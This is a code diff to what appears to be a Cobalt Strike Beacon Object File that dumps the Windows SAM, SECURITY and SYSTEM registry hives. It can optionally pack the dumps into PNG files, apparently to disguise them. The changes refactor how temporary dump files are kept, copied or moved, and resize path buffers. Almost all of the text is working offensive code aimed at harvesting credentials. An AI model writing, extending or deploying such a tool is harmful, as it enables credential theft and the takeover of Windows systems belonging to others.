@@ -86,6 +86,7 @@ BOOL NTAPI __declspec(dllimport) KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWOR
 DWORD NTAPI __declspec(dllimport) KERNEL32$GetFileSize(HANDLE, LPDWORD);
 BOOL NTAPI __declspec(dllimport) KERNEL32$DeleteFileW(LPCWSTR);
 BOOL NTAPI __declspec(dllimport) KERNEL32$MoveFileW(LPCWSTR, LPCWSTR);
+BOOL NTAPI __declspec(dllimport) KERNEL32$CopyFileW(LPCWSTR, LPCWSTR, BOOL);
 UINT NTAPI __declspec(dllimport) KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
 BOOL NTAPI __declspec(dllimport) KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 DWORD NTAPI __declspec(dllimport) KERNEL32$WaitForSingleObject(HANDLE, DWORD);
@@ -700,40 +701,32 @@ void go(char * args, int alen)
 
         if (samOk) {
             if (packPng) {
-                if (PackPng(samTmpW, samOutW, TRUE))
+                if (PackPng(samTmpW, samOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", samPath);
+            } else if (keepTemp) {
+                KERNEL32$CopyFileW(samTmpW, samOutW, FALSE);
             } else {
                 KERNEL32$MoveFileW(samTmpW, samOutW);
-            }
-            if (keepTemp) {
-                WCHAR keep[100];
-                AsciiToWide(samPath, keep, 92);
-                WCat(keep, L".tmp", 100);
-                KERNEL32$MoveFileW(samTmpW, keep);
             }
         }
         if (secOk) {
             if (packPng) {
-                if (PackPng(secTmpW, secOutW, TRUE))
+                if (PackPng(secTmpW, secOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", secPath);
+            } else if (keepTemp) {
+                KERNEL32$CopyFileW(secTmpW, secOutW, FALSE);
             } else {
                 KERNEL32$MoveFileW(secTmpW, secOutW);
-            }
-            if (keepTemp) {
-                WCHAR keep[100];
-                AsciiToWide(secPath, keep, 92);
-                WCat(keep, L".tmp", 100);
-                KERNEL32$MoveFileW(secTmpW, keep);
             }
         }
     }
 
     if (sysPath) {
-        WCHAR sysTmpW[300];
-        WCHAR sysOutW[300];
-        AsciiToWide(sysPath, sysTmpW, 296);
-        WCpy(sysOutW, sysTmpW, 300);
-        WCat(sysTmpW, L".tmp", 300);
+        WCHAR sysTmpW[120];
+        WCHAR sysOutW[120];
+        AsciiToWide(sysPath, sysTmpW, 116);
+        WCpy(sysOutW, sysTmpW, 120);
+        WCat(sysTmpW, L".tmp", 120);
 
         sysOk = SaveSystem(sysTmpW);
         if (sysOk)
@@ -743,16 +736,12 @@ void go(char * args, int alen)
 
         if (sysOk) {
             if (packPng) {
-                if (PackPng(sysTmpW, sysOutW, TRUE))
+                if (PackPng(sysTmpW, sysOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", sysPath);
+            } else if (keepTemp) {
+                KERNEL32$CopyFileW(sysTmpW, sysOutW, FALSE);
             } else {
                 KERNEL32$MoveFileW(sysTmpW, sysOutW);
-            }
-            if (keepTemp) {
-                WCHAR keep[100];
-                AsciiToWide(sysPath, keep, 292);
-                WCat(keep, L".tmp", 100);
-                KERNEL32$MoveFileW(sysTmpW, keep);
             }
         }
     }
